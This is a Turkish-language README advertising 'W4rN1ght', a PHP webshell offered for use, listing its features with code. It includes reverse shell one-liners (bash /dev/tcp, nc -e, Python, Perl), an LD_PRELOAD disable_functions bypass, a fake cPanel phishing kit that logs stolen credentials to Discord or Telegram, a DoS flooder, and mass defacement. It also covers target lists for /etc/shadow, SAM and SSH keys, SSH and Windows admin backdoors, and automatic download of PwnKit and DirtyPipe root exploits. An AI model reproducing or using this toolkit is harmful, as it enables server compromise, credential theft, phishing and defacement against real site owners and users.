# w4rn1ght
özgürlük ile birlikte sistemi sömür, nam-ı değer W4rn1ght


- öncelikle belirteyim, 2 günlük bir webshell hatalar olabilir tonca özellik barındırmakta ondan mütevellit çokta kusuruma bakmayın.
- discord: sarlokbaba
- tg: onemoriarty 

=====================


# W4rN1ght WebShell - Kapsamlı Özellik Listesi ve Analiz


## 🔐 GİRİŞ Mekanizması
session based oturum yönetimi ve cookie bazlı oturum hatırlama özelliği.

şifre: warnight2026

### 4. **Bot/Crawler Engelleme**
```php
$bots = array("Googlebot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", 
              "bingbot", "facebookexternalhit", "GPTBot", "ChatGPT", "ClaudeBot", 
              "Perplexity", "Baiduspider", "Sogou");
```
- 14 farklı bot/crawler engelleniyor
- 404 hatası döndürerek gizlenme


## 📁 DOSYA YÖNETİMİ (FILE MANAGER)

### 1. **Temel Dosya İşlemleri**
- **Dosya Listeleme:** `scandir()` ile dizin içeriği
- **Dosya Okuma:** `file_get_contents()`, `file()`, `fopen()`, `readfile()` (fallback mekanizmalı)
- **Dosya Yazma:** `file_put_contents()`
- **Dosya Silme:** `unlink()`
- **Klasör Silme:** Recursive `deleteDirectory()` fonksiyonu
- **Dosya Taşıma/Yeniden Adlandırma:** `rename()`
- **Dosya Yükleme:** `move_uploaded_file()` ile upload
- **Dosya İndirme:** `readfile()` ile download

### 2. **Gelişmiş Dosya Özellikleri**
- **Dosya Boyutu Formatlama:** B, KB, MB, GB, TB cinsinden
- **İzin Gösterme:** Linux permission string (rwxrwxrwx formatında)
- **Tarih Gösterimi:** Dosya değiştirilme zamanı (Y-m-d H:i)
- **Klasör/Dosya Ayrımı:** İkonlarla görsel ayrım
- **Breadcrumb Navigasyon:** Dizin hiyerarşisi linkleri


### 3. **Editör Özellikleri**
- Modal içinde büyük dosya editörü
- 70vh yüksekliğinde editör alanı
- Yeşil renkli monospace font
- Kaydet/İptal butonları

---

## 💻 KOMUT ÇALIŞTIRMA (COMMAND EXECUTION)

### 7+ Farklı Yöntem (Fallback Mekanizmalı)

| # | Fonksiyon | Açıklama |
|---|-----------|----------|
| 1 | `shell_exec()` | En yaygın method |
| 2 | `exec()` | Array çıktılı |
| 3 | `system()` | Direkt çıktı |
| 4 | `passthru()` | Binary çıktı |
| 5 | `popen()` | Pipe üzerinden |
| 6 | `proc_open()` | Process kontrolü |
| 7 | Background işlemler | `> /dev/null 2>&1 &` |

### Özellikler
- **Arka Plan Çalıştırma:** `$background = true` parametresi
- **Cross-platform:** Windows/Linux uyumlu
- **Hata Yönetimi:** Tüm methodlar başarısızsa hata mesajı
- **Kullanılabilir Fonksiyon Listesi:** Dashboard'da gösterim

---

## 🛡️ BYPASSHELL - 5 FONKSİYONLU BYPASS

### 1. **mail() + LD_PRELOAD**
```php
file_put_contents('chankro.so', base64_decode($chankro));
file_put_contents('acpid.socket', $cmd);
putenv('CHANKRO=' . realpath('acpid.socket'));
putenv('LD_PRELOAD=' . realpath('chankro.so'));
@mail('a', 'a', 'a', 'a');
```
- chankro.so binary'si base64 gömülü (~200KB)
- LD_PRELOAD ile disable_functions bypass

### 2. **mb_send_mail() + LD_PRELOAD**
- Aynı LD_PRELOAD tekniği
- `mb_send_mail()` fonksiyonu ile

### 3. **error_log() + LD_PRELOAD**
- `error_log()` ile mail gönderimi
- LD_PRELOAD exploit'i tetikleme

### 4. **imap_mail() + LD_PRELOAD**
- IMAP mail fonksiyonu
- IMAP extension gerektirir

### 5. **proc_open()**
- Direkt process açma
- Pipe'lar ile I/O yönetimi

### Durum Göstergesi
- Her fonksiyon için ON/OFF badge
- Renkli durum göstergeleri (yeşil/kırmızı)

---

## 🗝️ SSH CREATOR

### 1. **SSH Key Generation**
```php
ssh_create_key($username, $key_type = 'rsa', $bits = 4096)
```
- **RSA:** 4096 bit (2048-8192 arası ayarlanabilir)
- **ED25519:** En güvenli modern algoritma
- **ECDSA:** 521 bit

### 2. **Key Kurulumu**
- `~/.ssh` dizini oluşturma
- `authorized_keys` dosyasına ekleme
- `chmod 0600` ile güvenlik ayarı
- Private key konumu gösterme

---

## 🌐 NETWORK FLOODER (DoS)

### 1. **Linux Flood Yöntemleri**
```php
internal_dos_flood($target_ip, $duration = 60, $threads = 50)
```
- **Curl tabanlı flood:** 50+ thread ile eşzamanlı istek
- **Bash script oluşturma:** `/tmp/dos_*.sh`
- **Arka plan çalıştırma:** `nohup` ile

### 2. **Windows Flood Yöntemleri**
- **PowerShell script:** `C:\Windows\Temp\dos.ps1`
- **Job tabanlı thread:** `Start-Job` ile çoklu işlem
- **Gizli çalıştırma:** `-WindowStyle Hidden`

---

## 🎭 FAKE CPANEL CREATOR

### 1. **.htaccess Manipülasyonu**
```php
RewriteRule ^cpane1/?$ kpanel.php [QSA,L]
RewriteRule ^passwordreset/?$ reset.php [QSA,L]
```
- 10+ fake login dizini
- 6+ fake reset dizini
- 404/403 hatalarını yönlendirme

### 2. **Sahte Sayfalar**
- **kpanel.php:** Birebir cPanel login klonu
- **reset.php:** Şifre sıfırlama sayfası
- **stolen_creds.txt:** Çalınan bilgiler

### 3. **Loglama Yöntemleri**
| Yöntem | Açıklama |
|--------|----------|
| File | `stolen_creds.txt` dosyasına kayıt |
| Discord | Webhook ile bildirim |
| Telegram | Bot ile mesaj gönderme |
| Both | Hepsi birden |

### 4. **Özel Dizinler**
- Kullanıcı tanımlı tuzak dizinler
- Özel şifre sıfırlama yolları
---

## 🔍 PRIVILEGE ESCALATION SCANNER

### 1. **Linux PrivEsc Kontrolleri**
- `sudo -l` (sudo yetkileri)
- SUID dosyaları (`find / -perm -4000`)
- Yazılabilir dosyalar
- Crontab içeriği
- PATH kontrolü
- Kernel versiyonu

### 2. **Windows PrivEsc Kontrolleri**
- `whoami /priv` (yetkiler)
- Kullanıcı grupları
- `net user` bilgileri

### 3. **PEAS Entegrasyonu**
- **LinPEAS:** Linux için otomatik indirme/çalıştırma
- **WinPEAS:** Windows için otomatik indirme/çalıştırma
- Arka planda çalıştırma
- Çıktı dosyası oluşturma

---

## 💾 AUTO CONFIG FUCKER

### 1. **/etc/passwd Parser**
- Home dizinlerini çıkarma
- Kullanıcı adlarını eşleştirme
- public_html dizinlerini bulma

### 2. **Config Dosyası Tarama**
**Desteklenen CMS/Platformlar:**
- WordPress (`wp-config.php`, `wp-config-sample.php`)
- Joomla (`configuration.php`)
- Laravel (`config/database.php`, `app/config/database.php`)
- CodeIgniter (`application/config/database.php`)
- vBulletin (`includes/config.php`)
- WHMCS (`submitticket.php`, `clients/configuration.php`)
- Drupal (`settings.php`)
- phpMyAdmin (`config.inc.php`)
- MySQL (`.my.cnf`, `mysql.conf`)

### 3. **Özel Desenler**
```php
preg_match('/(config|database|db|settings|wp-config|conf)/i', $path)
preg_match('/\.(php|inc|conf|ini|env|yml|xml|json)$/', $path)
```

### 4. **ZIP Paketleme**
- Otomatik ZIP oluşturma (`configs_YYYYMMDD_HHMMSS.zip`)
- Dosya adı temizleme (`preg_replace('/[^a-zA-Z0-9_\.\-]/', '_', $fname)`)
- Kullanıcı_adı_CMS_tipi_dosyaadi.txt formatı
- Dosya limiti: < 1MB

---

## 📂 FILE FUCKER (40 KRİTİK DOSYA)

### Linux Hedef Dosyaları (20+)
```php
'/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
'/etc/group', '/etc/my.cnf', '/etc/httpd/conf/httpd.conf',
'/usr/local/apache2/conf/httpd.conf', '/etc/apache2/apache2.conf',
'/etc/nginx/nginx.conf', '/etc/php.ini', '/usr/local/php/lib/php.ini',
'/var/cpanel/accounting.log', '/etc/cpanel/ea4/passwd',
'/etc/psa/.psa.shadow', '/usr/local/directadmin/conf/mysql.conf',
'/etc/ssh/sshd_config', '/root/.bash_history', '/var/log/messages',
'/etc/cron.allow', '/etc/crontab', '/var/log/auth.log', '/var/log/secure',
'/etc/mysql/my.cnf', '/etc/postfix/main.cf', '/etc/exim/exim.conf',
'/etc/proftpd.conf', '/etc/vsftpd.conf', '/etc/sudoers',
'/root/.ssh/id_rsa', '/root/.ssh/authorized_keys',
'/var/spool/cron/crontabs/root', '/etc/security/passwd',
'/etc/security/opasswd', '/etc/security/group', '/etc/samba/smb.conf',
'/etc/pure-ftpd.conf', '/etc/wu-ftpd.conf', '/etc/ftpaccess',
'/etc/ssh/ssh_config'
```

### Windows Hedef Dosyaları (20+)
```php
'C:\\Windows\\System32\\drivers\\etc\\hosts',
'C:\\Windows\\System32\\config\\SAM',
'C:\\Windows\\System32\\config\\SYSTEM',
'C:\\Windows\\System32\\config\\SOFTWARE',
'C:\\Windows\\repair\\SAM',
'C:\\Windows\\repair\\SYSTEM',
'C:\\Windows\\repair\\SOFTWARE',
'C:\\Windows\\debug\\NetSetup.log',
'C:\\Windows\\iis6.log',
'C:\\inetpub\\wwwroot\\web.config',
'C:\\xampp\\apache\\conf\\httpd.conf',
'C:\\xampp\\mysql\\bin\\my.ini',
'C:\\xampp\\php\\php.ini',
'C:\\wamp\\bin\\apache\\apache2.*\\conf\\httpd.conf',
'C:\\wamp\\bin\\mysql\\mysql*\\my.ini',
'C:\\wamp\\bin\\php\\php*\\php.ini',
'C:\\Users\\Administrator\\NTUser.dat',
'C:\\boot.ini', 'C:\\Windows\\win.ini',
'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
'C:\\Program Files\\MySQL\\MySQL Server *\\my.ini',
'C:\\Program Files (x86)\\MySQL\\MySQL Server *\\my.ini',
'C:\\Windows\\System32\\config\\SECURITY',
'C:\\Windows\\System32\\config\\DEFAULT',
'C:\\Windows\\System32\\config\\COMPONENTS',
'C:\\Windows\\System32\\config\\BBI',
'C:\\Windows\\System32\\drivers\\etc\\networks',
'C:\\Windows\\System32\\drivers\\etc\\protocol',
'C:\\Windows\\System32\\drivers\\etc\\services',
'C:\\Windows\\System32\\drivers\\etc\\lmhosts.sam',
'C:\\Windows\\System32\\drivers\\etc\\hosts.ics',
'C:\\Windows\\System32\\winevt\\Logs\\System.evtx',
'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
'C:\\Windows\\System32\\winevt\\Logs\\Application.evtx',
'C:\\Windows\\System32\\config\\systemprofile\\NTUser.dat',
'C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat'
```

---

## 🌍 DOMAIN LİSTER (12 YÖNTEM)

| # | Yöntem | Kaynak |
|---|--------|--------|
| 1 | `m1()` | `/etc/named.conf` zone'ları |
| 2 | `m2()` | Apache vhosts (ServerName/ServerAlias) |
| 3 | `m3()` | `/home/*/public_html` dizinleri |
| 4 | `m4()` | `/etc/valiases/*` dosyaları |
| 5 | `m5()` | `/etc/named/*.db` ve `/var/named/*.db` |
| 6 | `m6()` | Plesk `/etc/psa/psa.conf` |
| 7 | `m7()` | Nginx sites-enabled |
| 8 | `m8()` | dnsmasq konfigürasyonu |
| 9 | `m9()` | `/etc/hosts` dosyası |
| 10 | `m10()` | `/etc/httpd/conf.d/*.conf` |

---

## 🔌 PORT SCANNER

### Özellikler
- TCP port tarama (`fsockopen()`)
- Özel port listesi tanımlama
- Servis adı çözümleme (`getservbyport()`)
- Timeout ayarı
- Varsayılan portlar: 21,22,23,25,80,110,143,443,445,465,993,995,3306,3389,5432,5900,6379,8080,8443,8888

---

## 💥 MASS DEFACER

### Özellikler
- Tüm home dizinlerini bulma (`get_all_home_dirs()`)
- 8 farklı hedef dosya: `index.php`, `index.html`, `index.htm`, `default.php`, `default.html`, `home.php`, `main.php`, tema dosyaları
- public_html içinde recursive arama
- Yazılabilirlik kontrolü (`is_writable()`)
- Deface sayısı raporu

### Örnek Deface İçeriği
```html
<html><head><title>Hacked by W4rN1ght</title>
<style>body{background:#000;color:#9c27b0;}</style>
</head><body><center><h1>Hacked by W4rN1ght</h1>
<p>Mr.Moriarty</p></center></body></html>
```

---

## 📤 ZONE-H SUBMIT

### Özellikler
- Zone-H deface bildirimi
- Tekli URL gönderimi
- Toplu domain bildirimi
- `curl` ile HTTP POST
- User-Agent spoofing

---

## 🔙 REVERSE SHELL GENERATOR

### 6 Farklı Shell Tipi

| Dil | Komut |
|-----|-------|
| **PHP** | `<?php $sock=fsockopen("IP",PORT);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);?>` |
| **Python** | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` |
| **Bash** | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| **Perl** | `perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` |
| **Ruby** | `ruby -rsocket -e 'c=TCPSocket.new("IP",PORT);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'` |
| **Netcat** | `nc -e /bin/sh IP PORT` |

### Ek Özellikler
- Clipboard'a kopyalama butonu
- IP/Port input alanları
- Otomatik komut oluşturma

---

## 💾 BACKUP ALMA (OS LEVEL)

### Linux
- `zip -r` komutu ile ZIP oluşturma
- Büyük dosyalar için `nohup` ile arka plan
- Anlık sonuç kontrolü

### Windows
- `powershell Compress-Archive`
- `start /B` ile arka plan çalıştırma
- Çıktı dosyası kontrolü

---

## 📧 MAIL SENDER

### Yöntemler
1. **PHP `mail()` fonksiyonu** (öncelikli)
2. **SMTP socket bağlantısı** (fallback)
   - `fsockopen()` ile 25. port
   - HELO, MAIL FROM, RCPT TO, DATA komutları

### Özellikler
- HTML mail desteği
- Custom headers
- Reply-To ayarı
- X-Mailer header (W4rN1ght WebShell)

---

## 🗄️ ADMINER YÜKLEME

### Özellikler
- Adminer v4.8.1 kurulumu
- GitHub'dan otomatik indirme
- `file_get_contents()` veya `wget/curl` ile
- Kurulum kontrolü
- Direkt açma linki

---

## 💾 DATABASE DUMP

### Özellikler
- MySQL/MariaDB dump
- Tek DB veya tüm DB'ler
- `mysqldump` kullanımı
- ZIP paketleme
- Geçici SQL dosyalarını temizleme

### Desteklenen
- `--all-databases` parametresi
- Şifreli bağlantı
- Windows/Linux uyumlu
- Sistem DB'lerini filtreleme (information_schema, performance_schema, mysql, sys)

---

## 🛡️ SAFE MODE BYPASS

### 5 Yöntem

| # | Yöntem | Açıklama |
|---|--------|----------|
| 1 | .htaccess | `php_value safe_mode Off` yazma |
| 2 | php.ini | `safe_mode=Off` yazma |
| 3 | ini_set() | Runtime konfigürasyon |
| 4 | Komut bypass | `execute_command()` ile disable_functions atlatma |
| 5 | Path traversal | `../../../../../../etc/passwd` okuma |

---

## 📁 OPEN BASEDIR BYPASS

### 5 Yöntem

| # | Yöntem | Açıklama |
|---|--------|----------|
| 1 | Symlink | `/etc/passwd`'e sembolik link |
| 2 | ini_restore() | `open_basedir`'i varsayılana döndürme |
| 3 | Path traversal | `../../../../../../etc/passwd` |
| 4 | file:// wrapper | `file:///etc/passwd` |
| 5 | php://filter | Base64 encode ile okuma |

---

## 📊 SQL FILE READER

### Özellikler
- MySQL `LOAD_FILE()` fonksiyonu
- MySQL bağlantısı gerektirir
- Dosya yolunu escape etme (`real_escape_string()`)
- Windows path dönüşümü (`/` → `\`)

---

## 👑 AUTO ROOT

### Exploitler
| Exploit | CVE | Kaynak |
|---------|-----|--------|
| PwnKit | CVE-2021-4034 | `https://github.com/ly4k/PwnKit/raw/main/PwnKit` |
| DirtyPipe | CVE-2022-0847 | `https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1` |

### Özellikler
- Otomatik exploit indirme
- `chmod +x` ile çalıştırılabilir yapma
- Root kontrolü (`uid=0(root)`)
- Çıktı gösterme

---

## 🐞 CVE SCANNER

### Kontrol Edilen CVE'ler
| CVE | Açıklama | Kernel Sürümü |
|-----|----------|---------------|
| CVE-2009-1185 | 2.6.x < 2.6 | 2.x < 2.6 |
| CVE-2016-5195 | DirtyCow | 2.6.39'dan küçük |
| CVE-2017-6074 | - | 3.x < 3.15 |
| CVE-2017-1000112 | - | 4.x < 4.9 |
| CVE-2021-33909 | - | 5.x < 5.8 |
| CVE-2022-0847 | DirtyPipe | 5.x < 5.13 |
| CVE-2021-4034 | PwnKit | `/usr/bin/pkexec` varsa |

---

## 🧩 MINI SHELLS

### 6 Farklı Shell
| Shell | Çalıştırma Yöntemi |
|-------|-------------------|
| PHP | `eval()` ile kod çalıştırma |
| Python | `python -c` ile komut |
| Perl | `perl -e` ile komut |
| Ruby | `ruby -e` ile komut |
| Bash | `bash -c` ile komut |
| CGI | Direkt sistem komutu |

---

## 🪟 WINDOWS ADMIN EKLEME

### Özellikler
- Yerel kullanıcı oluşturma (`net user`)
- Administrators grubuna ekleme
- Remote Desktop Users grubuna ekleme
- UAC bypass (`EnableLUA = 0`)
- RDP aktifleştirme
- Firewall kapatma (opsiyonel)
- SebDebugPrivilege ekleme

---

## 📦 ZIP PACKER

### Özellikler
- Çoklu dosya/klasör seçimi
- Recursive klasör paketleme
- Şifreli ZIP desteği (`zip -P`)
- ZIP arşivi oluşturma
- İndirme linki

---

## 🔗 SMART BYPASS (Symlink/Wrapper)

### Yöntemler
- `php://filter` wrapper
- `compress.zlib://` wrapper
- Base64 decode
- Rot13 decode
- `include()` ile PHP dosyası okuma
- `curl` ile uzak dosya okuma
- `cat` komutu ile okuma


## 📊 SİSTEM BİLGİLERİ (DASHBOARD)

### Gösterilen Bilgiler
| Bilgi | Kaynak |
|-------|--------|
| OS | `php_uname('s') . ' ' . php_uname('r')` |
| Hostname | `php_uname('n')` |
| Kullanıcı | `posix_getpwuid()` veya `get_current_user()` |
| UID/GID | `posix_geteuid()`, `posix_getegid()` |
| Server IP | `gethostbyname($_SERVER['HTTP_HOST'])` |
| Client IP | `$_SERVER['REMOTE_ADDR']` |
| PHP Version | `phpversion()` |
| Server Software | `$_SERVER['SERVER_SOFTWARE']` |
| Safe Mode | `ini_get('safe_mode')` |
| Disabled Functions | `ini_get('disable_functions')` |
| Open Basedir | `ini_get('open_basedir')` |
| Kernel | `php_uname('a')` |
